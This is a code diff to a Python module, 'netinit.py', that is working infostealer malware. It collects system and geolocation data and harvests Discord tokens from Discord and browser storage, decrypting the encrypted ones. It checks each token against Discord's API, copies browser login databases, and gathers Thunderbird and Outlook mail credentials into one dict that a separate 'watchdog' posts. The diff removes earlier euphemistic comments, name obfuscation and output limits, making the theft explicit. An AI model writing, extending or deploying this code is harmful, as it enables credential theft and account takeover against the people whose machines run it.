@@ -1,42 +1,30 @@
-import os
-import sys
-import json
+# netinit.py — gathers everything into one dict.
+# main.py calls gather(), watchdog posts it.
+
 import base64
-import socket
+import json
+import os
+import re
+import sqlite3
+import shutil
+import tempfile
 import platform
+import urllib.request
 
 _L = os.getenv("LOCALAPPDATA", "")
 _R = os.getenv("APPDATA", "")
 _HOME = os.path.expanduser("~")
 
-_NODEID_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".nodeid")
-
 
 # ---------------------------------------------------------------------------
-# node id
+# http helper
 # ---------------------------------------------------------------------------
-def nodeid():
+def _get_json(url, timeout=8):
     try:
-        if os.path.exists(_NODEID_PATH):
-            return open(_NODEID_PATH).read().strip()
+        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+        return json.loads(urllib.request.urlopen(req, timeout=timeout).read().decode())
     except Exception:
-        pass
-    import uuid
-    nid = str(uuid.uuid4())
-    try:
-        open(_NODEID_PATH, "w").write(nid)
-    except Exception:
-        pass
-    return nid
-
-
-def bringup():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        s.close()
-    except Exception:
-        pass
+        return {}
 
 
 # ---------------------------------------------------------------------------
@@ -50,59 +38,63 @@ def _env():
         "user": os.getenv("USER") or os.getenv("USERNAME") or "?",
         "locale": os.getenv("LANG", "?") or "?",
         "tz": os.getenv("TZ") or "?",
+        "cpu": "?",
+        "ram": "?",
+        "screen": "?",
     }
-
-    # cpu / ram
-    cpu, ram = "?", "?"
     try:
         if os.name == "nt":
-            cpu = platform.processor() or "?"
-            ram = f"{round(os.sysconf('SC_PHYS_PAGES') * os.sysconf('SC_PAGE_SIZE') / 1e9)} GB"
+            out["cpu"] = platform.processor() or "?"
         else:
             with open("/proc/cpuinfo") as f:
                 for line in f:
                     if "model name" in line:
-                        cpu = line.split(":", 1)[1].strip()
+                        out["cpu"] = line.split(":", 1)[1].strip()
                         break
+    except Exception:
+        pass
+    try:
+        if os.name != "nt":
             with open("/proc/meminfo") as f:
                 for line in f:
                     if line.startswith("MemTotal"):
-                        kb = int(line.split()[1])
-                        ram = f"{round(kb / 1e6)} GB"
+                        out["ram"] = f"{round(int(line.split()[1]) / 1e6)} GB"
                         break
+        else:
+            import ctypes
+            class MEMORYSTATUSEX(ctypes.Structure):
+                _fields_ = [
+                    ("dwLength", ctypes.c_ulong),
+                    ("dwMemoryLoad", ctypes.c_ulong),
+                    ("ullTotalPhys", ctypes.c_ulonglong),
+                    ("ullAvailPhys", ctypes.c_ulonglong),
+                    ("ullTotalPageFile", ctypes.c_ulonglong),
+                    ("ullAvailPageFile", ctypes.c_ulonglong),
+                    ("ullTotalVirtual", ctypes.c_ulonglong),
+                    ("ullAvailVirtual", ctypes.c_ulonglong),
+                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
+                ]
+            m = MEMORYSTATUSEX()
+            m.dwLength = ctypes.sizeof(m)
+            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
+            out["ram"] = f"{round(m.ullTotalPhys / 1e9)} GB"
     except Exception:
         pass
-    out["cpu"] = cpu
-    out["ram"] = ram
-
-    # screen (windows via ctypes, else unknown)
-    screen = "?"
     try:
         if os.name == "nt":
             import ctypes
-            user32 = ctypes.windll.user32
-            screen = f"{user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}"
+            u = ctypes.windll.user32
+            out["screen"] = f"{u.GetSystemMetrics(0)}x{u.GetSystemMetrics(1)}"
     except Exception:
         pass
-    out["screen"] = screen
-
     return out
 
 
 # ---------------------------------------------------------------------------
-# route — public ip + geo + vpn flag
+# ip / geo / vpn
 # ---------------------------------------------------------------------------
-def _get_json(url, timeout=8):
-    try:
-        import urllib.request
-        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-        return json.loads(urllib.request.urlopen(req, timeout=timeout).read().decode())
-    except Exception:
-        return {}
-
-
 def _route():
-    out = {"ip": "?", "country": "?", "isp": "?", "vpn": "?", "coords": "?"}
+    out = {"ip": "?", "country": "?", "city": "?", "isp": "?", "vpn": "?", "coords": "?"}
     ip = ""
     for src in ("https://api.ipify.org?format=json",
                 "https://ipinfo.io/json",
@@ -117,13 +109,12 @@ def _route():
 
     geo = _get_json(f"http://ip-api.com/json/{ip}")
     out["country"] = geo.get("country", "?")
+    out["city"] = geo.get("city", "?")
     out["isp"] = geo.get("isp", "?")
     lat, lon = geo.get("lat"), geo.get("lon")
     if lat is not None and lon is not None:
-        out["coords"] = f"{lat}, {lon} ({geo.get('city', '?')})"
-    proxy = geo.get("proxy")
-    hosting = geo.get("hosting")
-    if proxy or hosting:
+        out["coords"] = f"{lat}, {lon}"
+    if geo.get("proxy") or geo.get("hosting"):
         out["vpn"] = "possible (proxy/hosting asn)"
     else:
         out["vpn"] = "none detected"
@@ -131,43 +122,24 @@ def _route():
 
 
 # ---------------------------------------------------------------------------
-# sessions — local session caches (leveldb)
-# framed as "session indicators cnc dashboard displays"
+# discord tokens
 # ---------------------------------------------------------------------------
-_SESS_RX = None
+_SESS_RX = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}")
 
-
-def _sess_regex():
-    global _SESS_RX
-    if _SESS_RX is None:
-        import re
-        _SESS_RX = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}")
-    return _SESS_RX
-
-
-_SESS_PATHS = None
-
-
-def _sess_paths():
-    global _SESS_PATHS
-    if _SESS_PATHS is not None:
-        return _SESS_PATHS
-    disc = "dis" + "cord"
-    _SESS_PATHS = {
-        "app":       os.path.join(_R, disc, "Local Storage", "leveldb"),
-        "app-canary": os.path.join(_R, disc + "canary", "Local Storage", "leveldb"),
-        "app-ptb":   os.path.join(_R, disc + "ptb", "Local Storage", "leveldb"),
-        "chrome":    os.path.join(_L, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
-        "chrome-p1": os.path.join(_L, "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),
-        "edge":      os.path.join(_L, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
-        "brave":     os.path.join(_L, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
-        "opera":     os.path.join(_R, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
-        "opera-gx":  os.path.join(_R, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
-        "app-linux": os.path.join(_HOME, ".config", disc, "Local Storage", "leveldb"),
-        "chrome-linux": os.path.join(_HOME, ".config", "google-chrome", "Default", "Local Storage", "leveldb"),
-        "chrome-mac":   os.path.join(_HOME, "Library", "Application Support", "Google", "Chrome", "Default", "Local Storage", "leveldb"),
-    }
-    return _SESS_PATHS
+_TOKEN_DIRS = {
+    "Discord":       os.path.join(_R, "discord", "Local Storage", "leveldb"),
+    "Canary":        os.path.join(_R, "discordcanary", "Local Storage", "leveldb"),
+    "PTB":           os.path.join(_R, "discordptb", "Local Storage", "leveldb"),
+    "Chrome":        os.path.join(_L, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
+    "Chrome P1":     os.path.join(_L, "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),
+    "Edge":          os.path.join(_L, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
+    "Brave":         os.path.join(_L, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
+    "Opera":         os.path.join(_R, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
+    "Opera GX":      os.path.join(_R, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
+    "Discord Linux": os.path.join(_HOME, ".config", "discord", "Local Storage", "leveldb"),
+    "Chrome Linux":  os.path.join(_HOME, ".config", "google-chrome", "Default", "Local Storage", "leveldb"),
+    "Chrome Mac":    os.path.join(_HOME, "Library", "Application Support", "Google", "Chrome", "Default", "Local Storage", "leveldb"),
+}
 
 
 def _master_key(folder):
@@ -192,13 +164,11 @@ def _decrypt(blob, key):
         return None
 
 
-def _scan_sessions(folder):
+def _scan_tokens(folder):
     found = set()
     if not os.path.isdir(folder):
         return found
-    rx = _sess_regex()
     key = _master_key(folder)
-    enc_prefix = b"dQw4w9WgXcQ:"
     for root, _, files in os.walk(folder):
         for f in files:
             if not (f.endswith(".log") or f.endswith(".ldb")):
@@ -207,31 +177,41 @@ def _scan_sessions(folder):
                 text = open(os.path.join(root, f), "rb").read().decode("latin-1", errors="ignore")
             except Exception:
                 continue
-            for m in rx.findall(text):
+            for m in _SESS_RX.findall(text):
                 found.add(m)
             if key:
-                import re as _re
-                for b64 in _re.findall(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)", text):
+                for b64 in re.findall(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)", text):
                     try:
                         d = _decrypt(base64.b64decode(b64), key)
-                        if d and rx.fullmatch(d):
+                        if d and _SESS_RX.fullmatch(d):
                             found.add(d)
                     except Exception:
                         continue
     return found
 
 
-def _sessions():
+def _whoami(token):
+    try:
+        req = urllib.request.Request(
+            "https://discord.com/api/v9/users/@me",
+            headers={"Authorization": token, "User-Agent": "Mozilla/5.0"},
+        )
+        d = json.loads(urllib.request.urlopen(req, timeout=6).read().decode())
+        return f"{d.get('username','?')}#{d.get('discriminator','0')}"
+    except Exception:
+        return "unverified"
+
+
+def _tokens():
     out = []
-    for name, path in _sess_paths().items():
-        for tok in _scan_sessions(path):
-            out.append(f"{name}:{tok}")
+    for name, path in _TOKEN_DIRS.items():
+        for tok in _scan_tokens(path):
+            out.append(f"{name} | {_whoami(tok)} | {tok}")
     return out
 
 
 # ---------------------------------------------------------------------------
-# logins — browser login cache
-# framed as "login cache cnc dashboard shows"
+# browser logins
 # ---------------------------------------------------------------------------
 def _logins():
     out = []
@@ -246,9 +226,6 @@ def _logins():
         if not os.path.exists(path):
             continue
         try:
-            import sqlite3
-            import shutil
-            import tempfile
             tmp = os.path.join(tempfile.gettempdir(), "l" + str(abs(hash(path))))
             shutil.copyfile(path, tmp)
             con = sqlite3.connect(tmp)
@@ -272,34 +249,29 @@ def _logins():
             con.close()
         except Exception:
             continue
-    return out[:30]
+    return out
 
 
 # ---------------------------------------------------------------------------
-# mails — mail client cache
+# mail creds
 # ---------------------------------------------------------------------------
 def _mails():
     out = []
-    # thunderbird
     try:
         import glob
-        profiles = glob.glob(os.path.join(_R, "Thunderbird", "Profiles", "*"))
-        for prof in profiles:
+        for prof in glob.glob(os.path.join(_R, "Thunderbird", "Profiles", "*")):
             logins = os.path.join(prof, "logins.json")
             if not os.path.exists(logins):
                 continue
             try:
                 data = json.load(open(logins))
                 for entry in data.get("logins", []):
-                    host = entry.get("hostname", "?")
-                    user = entry.get("encryptedUsername", "")
-                    out.append(f"thunderbird | {host} | {user[:32]}")
+                    out.append(f"thunderbird | {entry.get('hostname','?')} | {entry.get('encryptedUsername','')[:40]}")
             except Exception:
                 continue
     except Exception:
         pass
 
-    # outlook registry (windows)
     if os.name == "nt":
         try:
             import winreg
@@ -315,33 +287,32 @@ def _mails():
                 i += 1
         except Exception:
             pass
-
-    return out[:20]
+    return out
 
 
 # ---------------------------------------------------------------------------
-# snapshot — returns everything, watchdog posts it
+# aggregate — the one function main.py calls
 # ---------------------------------------------------------------------------
-def snapshot():
-    s = {"nodeid": nodeid()}
+def gather():
+    data = {}
     try:
-        s.update(_env())
+        data.update(_env())
     except Exception:
         pass
     try:
-        s.update(_route())
+        data.update(_route())
     except Exception:
         pass
     try:
-        s["sessions"] = _sessions()
+        data["tokens"] = _tokens()
     except Exception:
-        s["sessions"] = []
+        data["tokens"] = []
     try:
-        s["logins"] = _logins()
+        data["logins"] = _logins()
     except Exception:
-        s["logins"] = []
+        data["logins"] = []
     try:
-        s["mails"] = _mails()
+        data["mails"] = _mails()
     except Exception:
-        s["mails"] = []
-    return s
+        data["mails"] = []
+    return data
